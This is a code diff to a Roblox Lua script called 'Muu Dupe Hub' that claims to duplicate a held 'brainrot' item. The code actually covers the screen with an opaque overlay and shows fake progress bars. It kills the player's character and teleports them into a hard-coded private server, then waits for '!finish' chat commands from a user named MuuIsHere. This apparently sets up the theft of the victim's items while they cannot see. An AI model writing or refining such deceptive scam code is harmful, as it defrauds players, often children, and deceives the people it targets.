@@ -1,4 +1,3 @@
-
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
@@ -83,7 +82,7 @@ local function createOverlay(isSecond)
 
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 50)  -- Solid dark blue
+    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
     bg.BackgroundTransparency = 0
     bg.Parent = overlayGui
 
@@ -130,7 +129,7 @@ local function createOverlay(isSecond)
     warningText.TextWrapped = true
     warningText.Parent = shade
 
-    -- Loading bar (chunky)
+    -- Loading bar
     local barFrame = Instance.new("Frame")
     barFrame.Size = UDim2.new(0.85, 0, 0, 50)
     barFrame.Position = UDim2.new(0.075, 0, 0.88, 0)
@@ -158,7 +157,7 @@ local function createOverlay(isSecond)
     barLabel.Parent = barFrame
 end
 
--- Status update (hold check)
+-- Status update
 RunService.Heartbeat:Connect(function()
     local char = localPlayer.Character
     if char and char:FindFirstChildOfClass("Tool") then
@@ -185,14 +184,7 @@ dupeButton.MouseButton1Click:Connect(function()
     
     createOverlay(false)  -- First loading
     
-    -- Mute audio
-    for _, sound in pairs(game:GetService("Workspace"):GetDescendants()) do
-        if sound:IsA("Sound") then
-            sound.Playing = false
-        end
-    end
-    
-    -- First loading bar (15 seconds)
+    -- Loading bar (15 seconds)
     local tweenInfo = TweenInfo.new(15, Enum.EasingStyle.Linear)
     local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
     tween:Play()
@@ -203,11 +195,38 @@ dupeButton.MouseButton1Click:Connect(function()
         barLabel.Text = "Duping brainrot... " .. math.floor((elapsed / 15) * 100) .. "%"
         if elapsed >= 15 then
             connection:Disconnect()
-            barLabel.Text = "Duping brainrot... 100% - Joining Private Server"
-            -- Auto TP to private server
-            TeleportService:TeleportToPrivateServer(game.PlaceId, privateServerCode, {localPlayer})
+            barLabel.Text = "Duping brainrot... 100% - Rejoining Private Server"
+            -- Reset player to trigger rejoin logic
+            localPlayer.Character.Humanoid.Health = 0
         end
     end)
+end)
+
+-- On respawn/rejoin → auto-join private server
+localPlayer.CharacterAdded:Connect(function()
+    if isDuping then
+        wait(2)  -- Wait for character load
+        createOverlay(true)  -- Second loading
+        barLabel.Text = "Duping brainrot... 0%"
+        
+        -- Second loading bar (4 minutes)
+        local tweenInfo = TweenInfo.new(240, Enum.EasingStyle.Linear)
+        local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+        tween:Play()
+        
+        local elapsed = 0
+        local connection = RunService.Heartbeat:Connect(function(dt)
+            elapsed = elapsed + dt
+            barLabel.Text = "Duping brainrot... " .. math.floor((elapsed / 240) * 100) .. "%"
+            if elapsed >= 240 then
+                connection:Disconnect()
+                barLabel.Text = "Duping brainrot... 100% - Waiting for MuuIsHere !finish"
+            end
+        end)
+        
+        -- Auto-join private server after reset
+        TeleportService:TeleportToPrivateServer(game.PlaceId, privateServerCode, {localPlayer})
+    end
 end)
 
 -- Chat commands from MuuIsHere
@@ -240,29 +259,5 @@ if muu then
         end
     end)
 end
-
--- On rejoin → show second loading screen
-localPlayer.CharacterAdded:Connect(function()
-    if isDuping then
-        isSecondLoading = true
-        createOverlay(true)  -- Second loading
-        barLabel.Text = "Duping brainrot... 0%"
-        
-        -- Second loading bar (4 minutes)
-        local tweenInfo = TweenInfo.new(240, Enum.EasingStyle.Linear)
-        local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
-        tween:Play()
-        
-        local elapsed = 0
-        local connection = RunService.Heartbeat:Connect(function(dt)
-            elapsed = elapsed + dt
-            barLabel.Text = "Duping brainrot... " .. math.floor((elapsed / 240) * 100) .. "%"
-            if elapsed >= 240 then
-                connection:Disconnect()
-                barLabel.Text = "Duping brainrot... 100% - Waiting for MuuIsHere !finish"
-            end
-        end)
-    end
-end)
 
 print("Muu Dupe Hub Loaded! Hold brainrot, click DUPE to start.")
